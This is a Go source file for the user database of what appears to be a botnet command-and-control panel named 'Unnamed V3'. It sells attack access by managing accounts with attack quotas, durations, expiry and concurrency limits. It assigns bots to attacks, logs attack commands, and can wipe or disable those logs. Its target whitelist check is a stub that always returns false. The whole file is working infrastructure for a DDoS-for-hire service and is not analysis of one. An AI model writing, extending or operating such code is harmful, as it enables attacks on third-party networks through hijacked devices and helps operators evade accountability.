package main

import (
    "encoding/json"
    "errors"
    "fmt"
    "io/ioutil"
    "io/fs"
    "os"
    "bufio"
    "sync"
    "time"
    "path/filepath"
    "strings"
)

// AccountInfo represents a user's account details
type AccountInfo struct {
    Username          string `json:"username"`
    Password          string `json:"password"`
    MaxBots           int    `json:"max_bots"`
    Admin             bool   `json:"admin"`
    Cooldown          int    `json:"cooldown"`
    DurationLimit     int    `json:"duration_limit"`
    Expiry            int64  `json:"expiry"`
    Banned            bool   `json:"banned"`
    Conns             int    `json:"conns"`
    Api               bool   `json:"api"`
    DailyAttackCount  int    `json:"daily_attack_count"`
    DailyAttackMax    int    `json:"daily_attack_max"`
    LastResetTime     int64  `json:"last_reset_time"`
    PowersavingBypass bool   `json:"powersaving_bypass"`
}

type AttackRecord struct {
    Username        string `json:"username"`
    Command         string `json:"command"`
    StartTime       int64  `json:"start_time"`
    Duration        uint32 `json:"duration"`
    BotsUsed        int    `json:"bots_used"`
    AssignedBotUIDs []int  `json:"assigned_bot_uids"`
}

type DatabaseData struct {
    Users                      []AccountInfo `json:"users"`
    TotalAttacks               int           `json:"total_attacks"`
    GlobalMaxConcurrentAttacks int           `json:"global_max_concurrent_attacks"`
    GlobalApiEnabled           bool          `json:"global_api_enabled"`
    GlobalAttacksEnabled       bool          `json:"global_attacks_enabled"`
    LoggingEnabled             bool          `json:"logging_enabled"`
}


type Database struct {
    filePath                   string
    mutex                      sync.Mutex
    attacks                    []AttackRecord
    globalMaxConcurrentAttacks int
    globalApiEnabled           bool
    globalAttacksEnabled       bool
    loggingEnabled             bool
    availableBots              map[int]bool
}

func NewDatabase(filePath string) *Database {
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        emptyData := DatabaseData{
            Users:                      []AccountInfo{},
            TotalAttacks:               0,
            GlobalMaxConcurrentAttacks: 4,
            GlobalApiEnabled:           true,
            GlobalAttacksEnabled:       true,
            LoggingEnabled:             true,
        }
        data, _ := json.MarshalIndent(emptyData, "", "  ")
        ioutil.WriteFile(filePath, data, 0644)
    }
    data, err := ioutil.ReadFile(filePath)
    if err != nil {
        os.Exit(1)
    }
    var dbData DatabaseData
    if err := json.Unmarshal(data, &dbData); err != nil {
        os.Exit(1)
    }
    if _, err := os.Stat("logs/attacks.txt"); os.IsNotExist(err) {
        os.MkdirAll("logs", 0755)
        ioutil.WriteFile("logs/attacks.txt", []byte{}, 0644)
    }
    fmt.Println("\033[95mStarting Unnamed V3... >\033[0m")
    d := &Database{
        filePath:                   filePath,
        attacks:                    []AttackRecord{},
        globalMaxConcurrentAttacks: dbData.GlobalMaxConcurrentAttacks,
        globalApiEnabled:           dbData.GlobalApiEnabled,
        globalAttacksEnabled:       dbData.GlobalAttacksEnabled,
        loggingEnabled:             dbData.LoggingEnabled,
        availableBots:              make(map[int]bool),
    }
    if err := d.fixJSON(); err != nil {
        fmt.Println("Error fixing JSON:", err)
    }
    go func() {
        for {
            time.Sleep(1 * time.Second)
            d.CleanupFinishedAttacks()
        }
    }()
    return d
}

func (d *Database) CleanupFinishedAttacks() {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    currentTime := time.Now().Unix()
    keepIndex := 0
    for i := 0; i < len(d.attacks); i++ {
        if d.attacks[i].StartTime+int64(d.attacks[i].Duration) > currentTime {
            // Attack is still running, keep it
            if i != keepIndex {
                d.attacks[keepIndex] = d.attacks[i]
            }
            keepIndex++
        } else {
            // Attack has finished, set bots to available if clientList is initialized
            if clientList != nil {
                for _, uid := range d.attacks[i].AssignedBotUIDs {
                    if _, exists := clientList.clients[uid]; exists {
                        d.availableBots[uid] = true
                    }
                }
            }
        }
    }
    // Truncate the slice to remove finished attacks
    d.attacks = d.attacks[:keepIndex]
    // Failsafe: if no attacks are running, ensure only connected bots are available
    if keepIndex == 0 && clientList != nil {
        for uid := range d.availableBots {
            if _, exists := clientList.clients[uid]; exists {
                if !d.availableBots[uid] {
                    d.availableBots[uid] = true
                    fmt.Printf("Failsafe: Reset bot %d to available\n", uid)
                }
            } else {
                delete(d.availableBots, uid)
                fmt.Printf("Failsafe: Removed disconnected bot %d from availableBots\n", uid)
            }
        }
    }
}

func (d *Database) fixJSON() error {
    data, err := ioutil.ReadFile(d.filePath)
    if err != nil {
        return err
    }

    var rawData struct {
        Users                      []map[string]interface{} `json:"users"`
        TotalAttacks               int                      `json:"total_attacks"`
        GlobalMaxConcurrentAttacks int                      `json:"global_max_concurrent_attacks"`
        GlobalApiEnabled           bool                     `json:"global_api_enabled"`
        GlobalAttacksEnabled       bool                     `json:"global_attacks_enabled"`
        LoggingEnabled             bool                     `json:"logging_enabled"`
    }
    if err := json.Unmarshal(data, &rawData); err != nil {
        return err
    }

    for _, user := range rawData.Users {
        if _, exists := user["powersaving_bypass"]; !exists {
            user["powersaving_bypass"] = false // Default to false if missing
        }
        if _, exists := user["banned"]; !exists {
            user["banned"] = false
        }
        if _, exists := user["conns"]; !exists {
            user["conns"] = 1
        }
        if _, exists := user["api"]; !exists {
            user["api"] = false
        }
        if _, exists := user["max_bots"]; !exists {
            user["max_bots"] = -1
        }
        if _, exists := user["admin"]; !exists {
            user["admin"] = false
        }
        if _, exists := user["cooldown"]; !exists {
            user["cooldown"] = 0
        }
        if _, exists := user["duration_limit"]; !exists {
            user["duration_limit"] = 0
        }
        if _, exists := user["expiry"]; !exists {
            user["expiry"] = 0
        }
        if _, exists := user["daily_attack_count"]; !exists {
            user["daily_attack_count"] = 0
        }
        if _, exists := user["daily_attack_max"]; !exists {
            user["daily_attack_max"] = 100
        }
        if _, exists := user["last_reset_time"]; !exists {
            user["last_reset_time"] = time.Now().Unix()
        }
    }
    if rawData.GlobalApiEnabled == false && rawData.GlobalAttacksEnabled == false {
        rawData.GlobalApiEnabled = true
        rawData.GlobalAttacksEnabled = true
    }
    if !rawData.LoggingEnabled {
        rawData.LoggingEnabled = true
    }

    fixedData, err := json.MarshalIndent(rawData, "", "  ")
    if err != nil {
        return err
    }
    return ioutil.WriteFile(d.filePath, fixedData, 0644)
}


func (d *Database) ResetBotAvailability(uid int) {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    d.availableBots[uid] = true
    fmt.Printf("Reset bot %d availability to true\n", uid)
}

func (d *Database) readUsers() (DatabaseData, error) {
    data, err := ioutil.ReadFile(d.filePath)
    if err != nil {
        return DatabaseData{}, err
    }
    var dbData DatabaseData
    if err := json.Unmarshal(data, &dbData); err != nil {
        return DatabaseData{}, err
    }
    return dbData, nil
}


func (d *Database) writeUsers(dbData DatabaseData) error {
    data, err := json.MarshalIndent(dbData, "", "  ")
    if err != nil {
        return err
    }
    return ioutil.WriteFile(d.filePath, data, 0644)
}

// TryLogin attempts to authenticate a user
func (d *Database) TryLogin(username, password string) (bool, AccountInfo, string) {
    dbData, err := d.readUsers()
    if err != nil {
        fmt.Println(err)
        return false, AccountInfo{}, "Database error."
    }
    for _, user := range dbData.Users {
        if user.Username == username {
            if user.Banned {
                return false, AccountInfo{}, "Account is banned."
            }
            if user.Password == password {
                if user.Expiry == 0 || time.Now().Unix() < user.Expiry {
                    return true, user, ""
                } else {
                    return false, AccountInfo{}, "Account has expired."
                }
            } else {
                return false, AccountInfo{}, "Wrong password."
            }
        }
    }
    return false, AccountInfo{}, "User not found."
}

// CreateUser adds a new user to the database
func (d *Database) CreateUser(username, password string, maxBots, duration, cooldown, expiryDays, conns, dailyAttackMax int, admin, api, powersavingBypass bool) bool {
    dbData, err := d.readUsers()
    if err != nil {
        fmt.Println(err)
        return false
    }
    for _, user := range dbData.Users {
        if user.Username == username {
            return false
        }
    }
    newUser := AccountInfo{
        Username:          username,
        Password:          password,
        MaxBots:           maxBots,
        Admin:             admin,
        Cooldown:          cooldown,
        DurationLimit:     duration,
        Banned:            false,
        Conns:             conns,
        Api:               api,
        DailyAttackCount:  0,
        DailyAttackMax:    dailyAttackMax,
        LastResetTime:     time.Now().Unix(),
        PowersavingBypass: powersavingBypass, // Set the new field
    }
    if expiryDays > 0 {
        newUser.Expiry = time.Now().AddDate(0, 0, expiryDays).Unix()
    } else {
        newUser.Expiry = 0
    }
    dbData.Users = append(dbData.Users, newUser)
    if err := d.writeUsers(dbData); err != nil {
        fmt.Println(err)
        return false
    }
    return true
}

// removeUser deletes a user from the database
func (d *Database) removeUser(username string) bool {
    dbData, err := d.readUsers()
    if err != nil {
        fmt.Println(err)
        return false
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users = append(dbData.Users[:i], dbData.Users[i+1:]...)
            if err := d.writeUsers(dbData); err != nil {
                fmt.Println(err)
                return false
            }
            return true
        }
    }
    return false
}

// fetchUsers returns the number of users
func (d *Database) fetchUsers() int {
    dbData, err := d.readUsers()
    if err != nil {
        fmt.Println(err)
        return 0
    }
    return len(dbData.Users)
}

// ListUsers returns all users
func (d *Database) ListUsers() ([]AccountInfo, error) {
    dbData, err := d.readUsers()
    if err != nil {
        return nil, err
    }
    return dbData.Users, nil
}

// GetUserInfo retrieves information for a specific user
func (d *Database) GetUserInfo(username string) (AccountInfo, error) {
    dbData, err := d.readUsers()
    if err != nil {
        return AccountInfo{}, err
    }
    for _, user := range dbData.Users {
        if user.Username == username {
            return user, nil
        }
    }
    return AccountInfo{}, errors.New("User not found")
}

// fetchAttacks returns the total number of attacks
func (d *Database) fetchAttacks() int {
    dbData, err := d.readUsers()
    if err != nil {
        fmt.Println(err)
        return 0
    }
    return dbData.TotalAttacks
}

// _fetchRunningAttacks returns the number of currently running attacks (no lock)
func (d *Database) _fetchRunningAttacks() int {
    currentTime := time.Now().Unix()
    count := 0
    for _, attack := range d.attacks {
        if attack.StartTime+int64(attack.Duration) > currentTime {
            count++
        }
    }
    return count
}

// _fetchUserRunningAttacks returns the number of running attacks for a user (no lock)
func (d *Database) _fetchUserRunningAttacks(username string) int {
    currentTime := time.Now().Unix()
    count := 0
    for _, attack := range d.attacks {
        if attack.Username == username && attack.StartTime+int64(attack.Duration) > currentTime {
            count++
        }
    }
    return count
}

// fetchRunningAttacks returns the number of currently running attacks (with lock)
func (d *Database) fetchRunningAttacks() int {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    return d._fetchRunningAttacks()
}

// fetchUserRunningAttacks returns the number of running attacks for a user (with lock)
func (d *Database) fetchUserRunningAttacks(username string) int {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    return d._fetchUserRunningAttacks(username)
}

// resetRunningAttacks clears the list of running attacks
func (d *Database) resetRunningAttacks() error {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    d.attacks = []AttackRecord{}
    return nil
}

// CleanLogs clears the attack log file
func (d *Database) CleanLogs() bool {
    err := ioutil.WriteFile("logs/attacks.txt", []byte{}, 0644)
    if err != nil {
        fmt.Println("Error clearing attack logs:", err)
        return false
    }
    return true
}

func (d *Database) SetUserPowersavingBypass(username string, value bool) error {
    // readUsers() already locks internally
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }

    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].PowersavingBypass = value
            // writeUsers() already locks internally
            return d.writeUsers(dbData)
        }
    }
    return fmt.Errorf("user %s not found", username)
}


func (db *Database) getMethodsStatistics() (map[string]int, error) {
    file, err := os.Open("logs/attack_logs.txt")
    if err != nil {
        return nil, err
    }
    defer file.Close()

    stats := make(map[string]int)
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := scanner.Text()
        parts := strings.SplitN(line, " ---> ", 2)
        if len(parts) == 2 {
            rest := parts[1]
            userCmd := strings.SplitN(rest, " ----> ", 2)
            if len(userCmd) == 2 {
                command := userCmd[1]
                cmdParts := strings.Fields(command)
                if len(cmdParts) > 0 {
                    method := cmdParts[0]
                    stats[method]++
                }
            }
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    return stats, nil
}

func (db *Database) getUsersStatistics() (map[string]int, error) {
    file, err := os.Open("logs/attack_logs.txt")
    if err != nil {
        return nil, err
    }
    defer file.Close()

    stats := make(map[string]int)
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := scanner.Text()
        parts := strings.SplitN(line, " ---> ", 2)
        if len(parts) == 2 {
            rest := parts[1]
            userCmd := strings.SplitN(rest, " ----> ", 2)
            if len(userCmd) == 2 {
                username := userCmd[0]
                stats[username]++
            }
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    return stats, nil
}


func (d *Database) SetUserPassword(username, newPassword string) error {
    if newPassword == "" {
        return errors.New("Password cannot be empty")
    }
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].Password = newPassword
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}



// ContainsWhitelistedTargets is a placeholder method
func (d *Database) ContainsWhitelistedTargets(attack *AttackRecord) bool {
    return false
}

// CanLaunchAttack checks if an attack can be launched and records it
func (d *Database) CanLaunchAttack(username string, duration uint32, command string, maxBots int) (bool, []int, error) {
    d.mutex.Lock()
    defer d.mutex.Unlock()

    if !d.globalAttacksEnabled {
        return false, nil, errors.New("Global attacks are disabled")
    }

    if duration < 1 {
        return false, nil, errors.New("Duration must be at least 1 second")
    }

    data, err := ioutil.ReadFile(d.filePath)
    if err != nil {
        return false, nil, err
    }
    var dbData DatabaseData
    if err := json.Unmarshal(data, &dbData); err != nil {
        return false, nil, err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            if user.Banned {
                return false, nil, errors.New("User is banned")
            }
            if user.DurationLimit != 0 && duration > uint32(user.DurationLimit) {
                return false, nil, fmt.Errorf("Your max attack time is %d seconds.", user.DurationLimit)
            }
            if !strings.HasPrefix(command, "stop") {
                currentTime := time.Now().Unix()
                if currentTime >= user.LastResetTime+86400 {
                    dbData.Users[i].DailyAttackCount = 0
                    dbData.Users[i].LastResetTime = currentTime
                }
                if dbData.Users[i].DailyAttackMax > 0 && dbData.Users[i].DailyAttackCount >= dbData.Users[i].DailyAttackMax {
                    return false, nil, errors.New("Daily attack limit reached")
                }
            } else {
                // Handle stop command: reset bots for user's active attacks
                d.StopUserAttacks(username)
                return true, nil, nil
            }
            runningAttacks := d._fetchRunningAttacks()
            if runningAttacks >= d.globalMaxConcurrentAttacks && !strings.HasPrefix(command, "stop") {
                return false, nil, fmt.Errorf("Global concurrent attack limit reached (%d attacks)", d.globalMaxConcurrentAttacks)
            }
            userRunningAttacks := d._fetchUserRunningAttacks(username)
            if user.Conns > 0 && userRunningAttacks >= user.Conns && !strings.HasPrefix(command, "stop") {
                return false, nil, fmt.Errorf("User concurrent attack limit reached (%d attacks)", user.Conns)
            }

            // Determine number of bots to assign
            var botsToAssign int
            if maxBots == -1 || maxBots == 0 {
                botsToAssign = 1 // Default to 1 bot if none specified or -1
            } else {
                botsToAssign = maxBots
            }

            // Assign bots
            assignedBotUIDs := []int{}
            for uid, available := range d.availableBots {
                if available && len(assignedBotUIDs) < botsToAssign {
                    assignedBotUIDs = append(assignedBotUIDs, uid)
                    d.availableBots[uid] = false
                }
            }
            if len(assignedBotUIDs) == 0 {
                fmt.Printf("No bots available despite count: %v\n", d.availableBots)
                return false, nil, errors.New("No bots available for attack")
            }
            if maxBots > 0 && len(assignedBotUIDs) < maxBots {
                return false, nil, fmt.Errorf("Not enough bots available, requested %d, available %d", maxBots, len(assignedBotUIDs))
            }

            // Record the attack
            d.attacks = append(d.attacks, AttackRecord{
                Username:        username,
                Command:         command,
                StartTime:       time.Now().Unix(),
                Duration:        duration,
                BotsUsed:        len(assignedBotUIDs),
                AssignedBotUIDs: assignedBotUIDs,
            })
            if !strings.HasPrefix(command, "stop") {
                dbData.Users[i].DailyAttackCount++
            }
            dbData.TotalAttacks++
            data, err := json.MarshalIndent(dbData, "", "  ")
            if err != nil {
                return false, nil, err
            }
            if err := ioutil.WriteFile(d.filePath, data, 0644); err != nil {
                return false, nil, err
            }
            if d.loggingEnabled {
                logTime := time.Now().Format("02.01.2006 15:04")
                logEntry := fmt.Sprintf("[%s] ---> %s ----> %s\n", logTime, username, command)
                f, err := os.OpenFile("logs/attack_logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                if err != nil {
                    fmt.Println("Error logging attack:", err)
                } else {
                    _, err = f.WriteString(logEntry)
                    if err != nil {
                        fmt.Println("Error writing to log:", err)
                    }
                    err = f.Close()
                    if err != nil {
                        fmt.Println("Error closing file:", err)
                    }
                }
            }
            return true, assignedBotUIDs, nil
        }
    }
    return false, nil, errors.New("User not found")
}

// StopUserAttacks resets the availability of bots used in a user's active attacks
func (d *Database) StopUserAttacks(username string) {
    currentTime := time.Now().Unix()
    for i := 0; i < len(d.attacks); i++ {
        if d.attacks[i].Username == username && d.attacks[i].StartTime+int64(d.attacks[i].Duration) > currentTime {
            for _, uid := range d.attacks[i].AssignedBotUIDs {
                d.availableBots[uid] = true
                fmt.Printf("Reset bot %d availability to true for user %s\n", uid, username)
            }
            d.attacks = append(d.attacks[:i], d.attacks[i+1:]...)
            i--
        }
    }
}


// BanUser bans a user
func (d *Database) BanUser(username string) (bool, error) {
    dbData, err := d.readUsers()
    if err != nil {
        return false, err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            if user.Banned {
                return false, errors.New("User is already banned")
            }
            dbData.Users[i].Banned = true
            if err := d.writeUsers(dbData); err != nil {
                return false, err
            }
            return true, nil
        }
    }
    return false, errors.New("User not found")
}

// SetGlobalAttacksEnabled toggles global attack permission
func (d *Database) SetGlobalAttacksEnabled(enabled bool) error {
    d.mutex.Lock()
    d.globalAttacksEnabled = enabled
    d.mutex.Unlock()
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    dbData.GlobalAttacksEnabled = enabled
    return d.writeUsers(dbData)
}

// UnbanUser unbans a user
func (d *Database) UnbanUser(username string) (bool, error) {
    dbData, err := d.readUsers()
    if err != nil {
        return false, err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            if !user.Banned {
                return false, errors.New("User is not banned")
            }
            dbData.Users[i].Banned = false
            if err := d.writeUsers(dbData); err != nil {
                return false, err
            }
            return true, nil
        }
    }
    return false, errors.New("User not found")
}

func (d *Database) AddDaysToUser(username string, days int) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            if user.Expiry == 0 && days > 0 {
                dbData.Users[i].Expiry = time.Now().AddDate(0, 0, days).Unix()
            } else if user.Expiry != 0 {
                expiryTime := time.Unix(user.Expiry, 0)
                newExpiryTime := expiryTime.AddDate(0, 0, days)
                dbData.Users[i].Expiry = newExpiryTime.Unix()
            }
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

func (d *Database) SyncBotAvailability(uid int, available bool) {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    if available {
        d.availableBots[uid] = true
    } else {
        delete(d.availableBots, uid)
    }
}

// SetGlobalApiEnabled toggles global API access
func (d *Database) SetGlobalApiEnabled(enabled bool) error {
    d.mutex.Lock()
    d.globalApiEnabled = enabled
    d.mutex.Unlock()
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    dbData.GlobalApiEnabled = enabled
    return d.writeUsers(dbData)
}

// SetUserDays sets a user's expiry in days
func (d *Database) SetUserDays(username string, days int) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            if days == 0 {
                dbData.Users[i].Expiry = 0
            } else {
                dbData.Users[i].Expiry = time.Now().AddDate(0, 0, days).Unix()
            }
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

func (d *Database) SetGlobalMaxConcurrentAttacks(value int) error {
    if value < 0 {
        return errors.New("limit cannot be negative")
    }

    // —— 1) Read & update on disk, with their own locks if needed
    dbData, err := d.readUsers()           // don’t hold d.mutex here
    if err != nil {
        return err
    }
    dbData.GlobalMaxConcurrentAttacks = value
    if err := d.writeUsers(dbData); err != nil {
        return err
    }

    // —— 2) Now safely update the in-memory counter
    d.mutex.Lock()
    d.globalMaxConcurrentAttacks = value
    d.mutex.Unlock()

    return nil
}



// EnableLogs enables attack logging
func (d *Database) EnableLogs() error {
    d.mutex.Lock()
    d.loggingEnabled = true
    d.mutex.Unlock()
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    dbData.LoggingEnabled = true
    return d.writeUsers(dbData)
}

// DisableLogs disables attack logging
func (d *Database) DisableLogs() error {
    d.mutex.Lock()
    d.loggingEnabled = false
    d.mutex.Unlock()
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    dbData.LoggingEnabled = false
    return d.writeUsers(dbData)
}

func (d *Database) ClearLogs() error {
    d.mutex.Lock()
    defer d.mutex.Unlock()

    logDir := "logs"
    err := filepath.WalkDir(logDir, func(path string, d fs.DirEntry, err error) error {
        if err != nil {
            return err
        }
        if !d.IsDir() && filepath.Ext(path) == ".txt" {
            if writeErr := os.WriteFile(path, []byte{}, 0644); writeErr != nil {
                return fmt.Errorf("failed to clear file %s: %v", path, writeErr)
            }
        }
        return nil
    })

    if err != nil {
        return fmt.Errorf("failed to clear .txt logs: %v", err)
    }

    return nil
}

// ModifyUserConns adjusts a user's concurrent attack limit
func (d *Database) ModifyUserConns(username string, delta int) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            newConns := user.Conns + delta
            if newConns < 0 {
                newConns = 0
            }
            dbData.Users[i].Conns = newConns
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserConns sets a user's concurrent attack limit
func (d *Database) SetUserConns(username string, value int) error {
    if value < 0 {
        return errors.New("Concurrent attacks limit cannot be negative")
    }
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].Conns = value
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// ModifyUserDurationLimit adjusts a user's duration limit
func (d *Database) ModifyUserDurationLimit(username string, delta int) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            newDurationLimit := user.DurationLimit + delta
            if newDurationLimit < 0 {
                newDurationLimit = 0
            }
            dbData.Users[i].DurationLimit = newDurationLimit
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserDurationLimit sets a user's duration limit
func (d *Database) SetUserDurationLimit(username string, value int) error {
    if value < 0 {
        return errors.New("Duration limit cannot be negative")
    }
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].DurationLimit = value
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// ModifyUserCooldown adjusts a user's cooldown
func (d *Database) ModifyUserCooldown(username string, delta int) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            newCooldown := user.Cooldown + delta
            if newCooldown < 0 {
                newCooldown = 0
            }
            dbData.Users[i].Cooldown = newCooldown
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserCooldown sets a user's cooldown
func (d *Database) SetUserCooldown(username string, value int) error {
    if value < 0 {
        return errors.New("Cooldown cannot be negative")
    }
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].Cooldown = value
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserAdmin sets a user's admin status
func (d *Database) SetUserAdmin(username string, admin bool) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].Admin = admin
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserApi sets a user's API access
func (d *Database) SetUserApi(username string, api bool) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].Api = api
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserDailyAttackMax sets a user's daily attack maximum
func (d *Database) SetUserDailyAttackMax(username string, value int) error {
    if value < 0 {
        return errors.New("Daily attack max cannot be negative")
    }
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].DailyAttackMax = value
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// ModifyUserDailyAttackMax adjusts a user's daily attack maximum
func (d *Database) ModifyUserDailyAttackMax(username string, delta int) error {
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            newValue := user.DailyAttackMax + delta
            if newValue < 0 {
                newValue = 0
            }
            dbData.Users[i].DailyAttackMax = newValue
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// SetUserDailyAttackCount sets a user's daily attack count
func (d *Database) SetUserDailyAttackCount(username string, count int) error {
    if count < 0 {
        return errors.New("Daily attack count cannot be negative")
    }
    dbData, err := d.readUsers()
    if err != nil {
        return err
    }
    for i, user := range dbData.Users {
        if user.Username == username {
            dbData.Users[i].DailyAttackCount = count
            return d.writeUsers(dbData)
        }
    }
    return errors.New("User not found")
}

// GetActiveAttacks returns a user's active attacks
func (d *Database) GetActiveAttacks(username string) []AttackRecord {
    d.mutex.Lock()
    defer d.mutex.Unlock()
    currentTime := time.Now().Unix()
    var active []AttackRecord
    for _, attack := range d.attacks {
        if attack.Username == username && attack.StartTime+int64(attack.Duration) > currentTime {
            active = append(active, attack)
        }
    }
    return active
}
